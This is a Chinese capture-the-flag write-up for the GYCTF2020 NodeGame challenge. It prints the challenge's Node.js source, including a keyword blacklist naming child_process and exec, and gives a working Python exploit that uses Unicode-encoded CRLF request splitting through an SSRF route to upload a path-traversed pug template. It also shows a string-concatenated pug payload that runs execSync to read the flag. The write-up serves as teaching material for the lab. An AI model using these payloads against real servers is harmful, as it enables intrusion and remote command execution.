---
title: GYCTF2020-NodeGame
date: 2025-05-26 20:51:49
tags:
- node.js HTTP拆分攻击
- ssrf
- CRLF
- http走私
---

# GYCTF2020-NodeGame

参考博客：

https://blog.csdn.net/qq_61209261/article/details/125778820

https://blog.csdn.net/weixin_46081055/article/details/119982707

https://www.anquanke.com/post/id/241429

首先打开网页

发现两个链接，一个查看源码，一个文件上传页面。

先看源码，代码审计

```
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path'); // 处理文件路径
var http = require('http');
var pug = require(`pug`); // 模板渲染
var morgan = require('morgan'); // 日志
const multer = require('multer'); // 用于处理multipart/form-data类型的表单数据，实现上传功能；个人一般使用formidable实现上传
 
// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组
app.use(multer({dest: './dist'}).array('file'));
// 使用简化版日志
app.use(morgan('short'));
 
// 静态文件路由
app.use("/uploads", express.static(path.join(__dirname, '/uploads')))
app.use("/template", express.static(path.join(__dirname, '/template')))
 
app.get('/', function (req, res) {
    // GET方法获取action参数
    var action = req.query.action ? req.query.action : "index";
    // action中不能包含/  \\
    if (action.includes("/") || action.includes("\\")) {
        res.send("Errrrr, You have been Blocked");
    }
    // 将/template/[action].pug渲染成html输出到根目录
    file = path.join(__dirname + '/template/' + action + '.pug');
    var html = pug.renderFile(file);
    res.send(html);
});
 
app.post('/file_upload', function (req, res) {
    var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接
    var obj = {msg: '',}
    // 请求必须来自localhost
    if (!ip.includes('127.0.0.1')) {
        obj.msg = "only admin's ip can use it"
        res.send(JSON.stringify(obj));//JSON.stringify()方法用于将JavaScript值转换为JSON字符
        return
    }
    // node.js读取文件 fs.readFile(),一种格式fs.readFile(filePath,{encoding:"utf-8"}, function (err, fr){
    fs.readFile(req.files[0].path, function (err, data) {
        // 判断上传文件合法
        if (err) {
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        } else {
            // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面
            var file_path = '/uploads/' + req.files[0].mimetype + "/";
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if (!fs.existsSync(__dirname + file_path)) {
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file, data)
                obj = {msg: 'upload success', filename: file_path + file_name}
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));
        }
    })
})
 
// 查看题目源码
app.get('/source', function (req, res) {
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});
 
// ssrf核心 
app.get('/core', function (req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q
        console.log(url)
        // 对url字符进行waf
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("error occurs!");
        } else {
            try {
                // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过
                http.get(url, function (resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function (err) {
                        if (err.code === "ECONNRESET") {
                            console.log("Timeout occurs");
                        }
                    });
                    // 返回结果输出到/core
                    resp.on('data', function (chunk) {
                        try {
                            resps = chunk.toString();
                            res.send(resps);
                        } catch (e) {
                            res.send(e.message);
                        }
                    }).on('error', (e) => {
                        res.send(e.message);
                    });
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})
 
// 关键字waf 利用字符串拼接实现绕过
function blacklist(url) {
    var evilwords = ["global", "process", "mainModule", "require", "root", "child_process", "exec", "\"", "'", "!"];
    var arrayLen = evilwords.length;
 
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) {
            return true
        }
    }
}
 
var server = app.listen(8081, function () {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})
```

路由功能：

- /：会包含/template目录下的一个pug模板文件并用pub模板引擎进行渲染

- /source：回显源码

- /file_upload：限制了只能由127.0.0.1的ip将文件上传到uploads目录里面，所以需要进行ssrf。并且我们可以通过控制mimetype进行目录穿越，从而将文件上传到任意目录。

- /core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。

  ```
  思路：利用SSRF伪造本地ip进行文件上传， 上传一个pug模板文件到/template目录下，这个pug模板文件中含有将根目录里的flag包含进来的代码，然后用?action=来包含该文件，就可读取到flag
  ```

  [pug模板文件–pug的包含](https://www.pugjs.cn/language/includes.html#including-plain-text)

在文件上传处抓包

对抓取到的文件上传的数据包进行**删除Cookie，并将Host、Origin、Referer等改为本地地址、Content-Type改为 `../template` 用于目录穿越（注意Content-Length也需要改成变化后的值）**，然后编写以下利用脚本：

```
import requests
import urllib.parse

payload = ''' HTTP/1.1

POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: 266
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytiv5xTGEO0V9ggkc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: 127.0.0.1/?action=upload
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarytiv5xTGEO0V9ggkc
Content-Disposition: form-data; name="file"; filename="flgg.pug"
Content-Type: ../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundarytiv5xTGEO0V9ggkc--

GET / HTTP/1.1
test:'''.replace("\n","\r\n")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret
    
payload = payload_encode(payload)

print(payload)
r = requests.get('http://f7eab690-f200-4355-91f7-65c6290ed626.node4.buuoj.cn:81/core?q=' + urllib.parse.quote(payload))
print(r.text)

#urllib.parse.quote：URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。
```

加密也可以用另一种方法

```
def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret
    
payload = payload_encode(payload)

↓

payload = payload.replace('\r\n', '\u010d\u010a') \
    .replace('+', '\u012b') \
    .replace(' ', '\u0120') \
    .replace('"', '\u0122') \
    .replace("'", '\u0a27') \
    .replace('[', '\u015b') \
    .replace(']', '\u015d') \
    .replace('`', '\u0127') \
    .replace('"', '\u0122') \
    .replace("'", '\u0a27') \
    .replace('[', '\u015b') \
    .replace(']', '\u015d') \

```

上传pug成功之后，访问?action=[pug的名字] （好像pug不久就会清除掉）

##### 关于pug

上传的pug，不止有includ文件的方法

```
doctype html
html
  head
    style
      include ../../../../../../../flag.txt
```

还有通过拼接 命令执行

```
-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")
-return x
```

## **1. 漏洞背景**

### **(1) 目标代码的关键限制**

javascript

```
app.post('/file_upload', function(req, res) {
    var ip = req.connection.remoteAddress; // 获取TCP连接的真实IP
    if (!ip.includes('127.0.0.1')) {      // 只允许本地IP访问
        res.send("only admin's ip can use it");
        return;
    }
    // 文件上传逻辑...
});
```

- **关键点**：`req.connection.remoteAddress` 是 **TCP 层的真实 IP**，无法通过 HTTP 头（如 `X-Forwarded-For`）伪造。
- **问题**：攻击者如何绕过这个限制？

### **(2) 另一个漏洞点（SSRF）**

javascript

```
app.get('/core', function(req, res) {
    var q = req.query.q;
    var url = 'http://localhost:8081/source?' + q;
    http.get(url, function(resp) { ... }); // 发起HTTP请求
});
```

- 这里存在 **SSRF**，因为 `q` 参数可控，可以构造任意 HTTP 请求。

------

## **2. 攻击原理：SSRF + 请求走私**

### **(1) 目标**

- 通过 `/core` 的 SSRF 漏洞，让服务器自己向 `/file_upload` 发起一个 **“走私请求”**。
- 由于这个请求是服务器 **自己发给自己** 的，`req.connection.remoteAddress` 会是 `127.0.0.1`，从而绕过 IP 检查。

### **(2) 攻击步骤**

1. **构造一个“畸形”的 SSRF 请求**，使其被解析成 **两个HTTP请求**：

   - 第一个请求：`GET /core?q=...`（触发 SSRF）。
   - 第二个请求：`POST /file_upload`（ smuggled 请求，用于上传文件）。

2. **利用 CRLF 注入** 让后端误解析：

   http

```
GET /core?q=HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aPOST%20/file_upload%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20multipart/form-data%0d%0a...
```

- `%0d%0a` 是 `\r\n` 的 URL 编码，用于伪造 HTTP 协议的分隔符。

**后端服务器的解析过程**：

- **前端服务器（如 Nginx）** 可能认为这是一个普通的 `GET /core` 请求。

- **后端服务器（Node.js）** 由于解析不严格，可能会拆分成：

  http

1. - ```
     GET /core?q=HTTP/1.1
     Host: 127.0.0.1
     
     POST /file_upload HTTP/1.1
     Host: 127.0.0.1
     Content-Type: multipart/form-data
     ...
     ```

     - 第一个请求：`GET /core?q=HTTP/1.1`（无用）。
     - 第二个请求：`POST /file_upload`（ smuggled 请求，IP 是 `127.0.0.1`）。

2. **结果**：

   - `/file_upload` 的 `req.connection.remoteAddress` 是 `127.0.0.1`（因为是服务器自己发的请求）。
   - 绕过 IP 限制，成功上传恶意文件。

------

## **3. 为什么能绕过 IP 检查？**

- **`req.connection.remoteAddress` 是 TCP 层的真实 IP**：
  - 如果攻击者直接访问 `/file_upload`，IP 是他们的公网 IP（如 `123.123.123.123`），会被拦截。
  - 但如果请求是 **服务器自己发给自己**（通过 SSRF + 走私），IP 就是 `127.0.0.1`，符合检查条件。
- **关键点**：
  - 请求走私让后端认为 smuggled 请求 (`POST /file_upload`) 是 **来自本地** 的。
  - 这是 **协议层欺骗**，比单纯改 HTTP 头（如 `X-Forwarded-For`）更底层，无法被简单防御。



















